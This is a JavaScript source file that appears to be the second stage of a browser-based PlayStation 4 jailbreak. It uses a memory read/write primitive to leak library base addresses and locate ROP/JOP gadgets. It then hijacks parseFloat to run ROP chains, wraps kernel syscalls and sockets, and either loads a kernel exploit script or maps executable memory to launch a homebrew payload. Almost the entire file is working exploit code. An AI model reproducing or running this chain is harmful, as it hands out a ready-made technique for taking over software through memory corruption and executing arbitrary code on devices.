var p;

var print = function (x) {
  document.getElementById("console").innerText += x + "\n";
}
var print = function (string) { // like print but html
  document.getElementById("console").innerHTML += string + "\n";
}

var get_jmptgt = function (addr) {
  var z = p.read4(addr) & 0xFFFF;
  var y = p.read4(addr.add32(2));
  if (z != 0x25ff) return 0;

  return addr.add32(y + 6);
}

var gadgetmap_wk = {
  "ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
  "pop rsi": [0x5e, 0xc3],
  "pop rdi": [0x5f, 0xc3],
  "pop rsp": [0x5c, 0xc3],
  "pop rax": [0x58, 0xc3],
  "pop rdx": [0x5a, 0xc3],
  "pop rcx": [0x59, 0xc3],
  "pop rsp": [0x5c, 0xc3],
  "pop rbp": [0x5d, 0xc3],
  "pop r8": [0x47, 0x58, 0xc3],
  "pop r9": [0x47, 0x59, 0xc3],
  "infloop": [0xeb, 0xfe, 0xc3],
  "ret": [0xc3],
  "mov [rdi], rsi": [0x48, 0x89, 0x37, 0xc3],
  "mov [rax], rsi": [0x48, 0x89, 0x30, 0xc3],
  "mov [rdi], rax": [0x48, 0x89, 0x07, 0xc3],
  "mov rax, rdi": [0x48, 0x89, 0xf8, 0xc3]
};

var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
slowpath_jop.reverse();

var gadgets;
window.stage2 = function () {
  try {
    window.stage2_();
  } catch (e) {
    print(e);
  }
}

gadgetcache = {
  // Regular ROP Gadgets
  "ret":                    0x0000003C, // Updated
  "jmp rax":                0x00000082, // Updated
  "ep":                     0x000000AD, // Updated
  "pop rbp":                0x000000B6, // Updated
  "mov [rdi], rax":         0x00003FBA, // Updated
  "pop r8":                 0x0000CC42, // Updated
  "pop rax":                0x0000CC43, // Updated
  "mov rax, rdi":           0x0000E84E, // Updated
  "mov rax, [rax]":         0x000130A3, // Updated
  "pop rsi":                0x0007B1EE, // Updated
  "pop rdi":                0x0007B23D, // Updated
  "pop rcx":                0x00271DE3, // Updated
  "pop rsp":                0x0027A450, // Updated
  "mov [rdi], rsi":         0x0039CF70, // Updated
  "mov [rax], rsi":         0x003D0877, // Updated
  "pop rdx":                0x00633F7A, // Updated
  "pop r9":                 0x0078BA1F, // Updated
  "jop":                    0x01277350, // Updated
  "infloop":                0x012C4009, // Updated

  "add rax, rcx":           0x0084D04D, // Updated
  "add rax, rsi":           0x00C71EC4, // Updated
  //"and rax, rsi":         0x00000000, // Fuck
  "mov rdx, rax":           0x00012A16, // Updated
  //"mov rdi, rax":         0x00000000, // Fuck
  "mov rax, rdx":           0x001E4EDE, // Updated
  "jmp rdi":                0x00182715, // Updated
  "mov rbp, rsp":           0x001B5B7A, // Updated
  "mov rax, [rdi]":         0x0013A220, // Updated
  "add rdi, rax":           0x0141D1CD, // Updated
  "mov [rsi], rdx":         0x01574006, // Updated

  // kROP Chain Stuff
  "ret2userland":           0x0008905C, // New
  "add [r9], rbp":          0x01320CB1, // New
  "mov rsp, rdx":           0x00F3DED0, // New
  "test":                   0x000028A2, // New
  "sub rax, rcx":           0x00E9478B, // New

  // JOP Gadgets
  "jop1":   0x005D365D, // New
  "jop2":   0x007B0E65, // New
  "jop3":   0x0142BDBB, // New
  "jop4":   0x00637AC4, // New
  "jop5":   0x001B5B7A, // New
  "jop6":   0x000F391D, // New

  "mov rsi, rdi":           0x00B29C5A, // New
};

window.stage2_ = function () {
  p = window.prim;

  p.leakfunc = function (func) {
    var fptr_store = p.leakval(func);
    return (p.read8(fptr_store.add32(0x18))).add32(0x40);
  }

  var parseFloatStore = p.leakfunc(parseFloat);
  var parseFloatPtr = p.read8(parseFloatStore);
  var webKitBase = p.read8(parseFloatStore);

  webKitBase.low &= 0xFFFFF000;
  webKitBase.sub32inplace(0xE8D000);

  window.webKitBase = webKitBase;

  var o2wk = function (o) {
    return webKitBase.add32(o);
  }

  gadgets = {
    "stack_chk_fail": o2wk(0xC8),
    "memset": o2wk(0x228),
    "setjmp": o2wk(0x1468)
  };

  var libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(0xF8)));
  libSceLibcInternalBase.low &= 0xFFFFF000;
  libSceLibcInternalBase.sub32inplace(0x2A000); // memcpy slide: 0x2A590

  var libKernelBase = p.read8(get_jmptgt(gadgets.stack_chk_fail));
  window.libKernelBase = libKernelBase;
  libKernelBase.low &= 0xFFFFC000;
  libKernelBase.sub32inplace(0xC000);

  window.o2libc = function (o) {
    return libSceLibcInternalBase.add32(o);
  }

  window.o2lk = function (o) {
    return libKernelBase.add32(o);
  }

  window.o2lk = o2lk;

  var wkview = new Uint8Array(0x1000);
  var wkstr = p.leakval(wkview).add32(0x10);
  var orig_wkview_buf = p.read8(wkstr);

  p.write8(wkstr, webKitBase);
  p.write4(wkstr.add32(8), 0x3052D38);

  var gadgets_to_find = 0;
  var gadgetnames = [];
  for (var gadgetname in gadgetmap_wk) {
    if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
      gadgets_to_find++;
      gadgetnames.push(gadgetname);
      gadgetmap_wk[gadgetname].reverse();
    }
  }

  gadgets_to_find++;

  var findgadget = function (donecb) {
    if (gadgetcache) {
      gadgets_to_find = 0;
      slowpath_jop = 0;

      for (var gadgetname in gadgetcache) {
        if (gadgetcache.hasOwnProperty(gadgetname)) {
          gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
        }
      }
    } else {
      for (var i = 0; i < wkview.length; i++) {
        if (wkview[i] == 0xc3) {
          for (var nl = 0; nl < gadgetnames.length; nl++) {
            var found = 1;
            if (!gadgetnames[nl]) continue;
            var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
            for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++) {
              if (gadgetbytes[compareidx] != wkview[i - compareidx]) {
                found = 0;
                break;
              }
            }
            if (!found) continue;
            gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
            gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
            delete gadgetnames[nl];
            gadgets_to_find--;
          }
        } else if (wkview[i] == 0xe0 && wkview[i - 1] == 0xff && slowpath_jop) {
          var found = 1;
          for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++) {
            if (slowpath_jop[compareidx] != wkview[i - compareidx]) {
              found = 0;
              break;
            }
          }
          if (!found) continue;
          gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
          gadgetoffs["jop"] = i - slowpath_jop.length + 1;
          gadgets_to_find--;
          slowpath_jop = 0;
        }

        if (!gadgets_to_find) break;
      }
    }
    if (!gadgets_to_find && !slowpath_jop) {
      setTimeout(donecb, 50);
    } else {
      print("missing gadgets: ");
      for (var nl in gadgetnames) {
        print(" - " + gadgetnames[nl]);
      }
      if (slowpath_jop) print(" - jop gadget");
    }
  }

  findgadget(function () { });
  var hold1;
  var hold2;
  var holdz;
  var holdz1;

  while (1) {
    hold1 = { a: 0, b: 0, c: 0, d: 0 };
    hold2 = { a: 0, b: 0, c: 0, d: 0 };
    holdz1 = p.leakval(hold2);
    holdz = p.leakval(hold1);
    if (holdz.low - 0x30 == holdz1.low) break;
  }

  var pushframe = [];
  pushframe.length = 0x80;
  var funcbuf;
  var funcbuf32 = new Uint32Array(0x100);
  nogc.push(funcbuf32);

  var launch_chain = function (chain) {
    var stackPointer = 0;
    var stackCookie = 0;
    var orig_reenter_rip = 0;

    var reenter_help = {
      length: {
        valueOf: function () {
          orig_reenter_rip = p.read8(stackPointer);
          stackCookie = p.read8(stackPointer.add32(8));
          var returnToFrame = stackPointer;

          var ocnt = chain.count;
          chain.push_write8(stackPointer, orig_reenter_rip);
          chain.push_write8(stackPointer.add32(8), stackCookie);

          if (chain.runtime) returnToFrame = chain.runtime(stackPointer);

          chain.push(gadgets["pop rsp"]);
          chain.push(returnToFrame); // -> back to the trap life
          chain.count = ocnt;

          p.write8(stackPointer, (gadgets["pop rsp"])); // pop pop
          p.write8(stackPointer.add32(8), chain.stackBase); // rop rop
        }
      }
    };
    
    funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));

    p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
    p.write8(funcbuf.add32(0x80), gadgets["jop"]);
    p.write8(funcbuf, funcbuf);
    p.write8(parseFloatStore, gadgets["jop"]);
    var orig_hold = p.read8(holdz1);
    var orig_hold48 = p.read8(holdz1.add32(0x48));

    p.write8(holdz1, funcbuf.add32(0x50));
    p.write8(holdz1.add32(0x48), funcbuf);
    parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
    p.write8(holdz1, orig_hold);
    p.write8(holdz1.add32(0x48), orig_hold48);

    stackPointer = p.read8(funcbuf.add32(0x10));
    rtv = Array.prototype.splice.apply(reenter_help);
    return p.leakval(rtv);
  }

  gadgets = gadgets;
  p.loadchain = launch_chain;

  function swapkeyval(json) {
    var ret = {};
    for (var key in json) {
      if (json.hasOwnProperty(key)) {
        ret[json[key]] = key;
      }
    }
    return ret;
  }

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);

  var countbytes;
  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);

  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }

  var chain = new window.rop;
  var returnvalue;

  p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    chain.clear();

    chain.notimes = this.next_notime;
    this.next_notime = 1;

    chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);

    chain.push(window.gadgets["pop rdi"]);
    chain.push(chain.stackBase.add32(0x3ff8));
    chain.push(window.gadgets["mov [rdi], rax"]);

    chain.push(window.gadgets["pop rax"]);
    chain.push(p.leakval(0x41414242));

    if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
    returnvalue = p.read8(chain.stackBase.add32(0x3ff8));
  }

  p.fcall = function () {
    var rv = p.fcall_.apply(this, arguments);
    return returnvalue;
  }

  p.readstr = function (addr) {
    var addr_ = addr.add32(0);
    var rd = p.read4(addr_);
    var buf = "";
    while (rd & 0xFF) {
      buf += String.fromCharCode(rd & 0xFF);
      addr_.add32inplace(1);
      rd = p.read4(addr_);
    }
    return buf;
  }

  p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    if (typeof sysc == "string") {
      sysc = window.syscallnames[sysc];
    }
    if (typeof sysc != "number") {
      throw new Error("invalid syscall");
    }

    var off = window.syscalls[sysc];
    if (off == undefined) {
      throw new Error("invalid syscall");
    }

    return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
  }

  p.socket = function() {
    return p.syscall('sys_socket', 2, 1, 0); // 2 = AF_INET, 1 = SOCK_STREAM, 0 = TCP
  }

  p.connect = function(s, ip, port) {
    var sockAddr    = new Uint32Array(0x10);
    var sockAddrPtr = p.read8(p.leakval(sockAddr).add32(0x10));
    var ipSegments  = ip.split('.');

    for(var seg = 0; seg < 4; seg++)
    {
      ipSegments[seg] = parseInt(ipSegments[seg]);
    }

    sockAddr[0] |= (((port >> 8) & 0xFF) << 0x10 | port << 0x18) | 0x200;
    sockAddr[1]  = ipSegments[3] << 24 | ipSegments[2] << 16 | ipSegments[1] << 8 | ipSegments[0];
    sockAddr[2]  = 0;
    sockAddr[3]  = 0;

    return p.syscall('sys_connect', s, sockAddrPtr, 0x10);
  }

  p.writeSocket = function(s, data, size) {
    return p.syscall('sys_write', s, data, size);
  }

  p.closeSocket = function(s) {
    return p.syscall('sys_close', s);
  }

  p.stringify = function (str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  };

  p.malloc = function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  p.malloc32 = function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  // Test if the kernel is already patched
  var test = p.syscall("sys_setuid", 0);
  if (test != '0') {
    // alert("Kernel not patched, run kernel exploit");
    sc = document.createElement("script");
    sc.src = "kernel.js";
    document.body.appendChild(sc);
  } else {
    //alert("Kernel patched, launch cool stuff");
	
		var code_addr = new int64(0x26100000, 0x00000009);
		var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);

		// Load HEN-VTX
		if (buffer == '926100000') {
			writePL(p.write4, code_addr.add32(0x100000));
		}

		// Launch HEN-VTX
		p.fcall(code_addr);
		
		allset();
  }
}
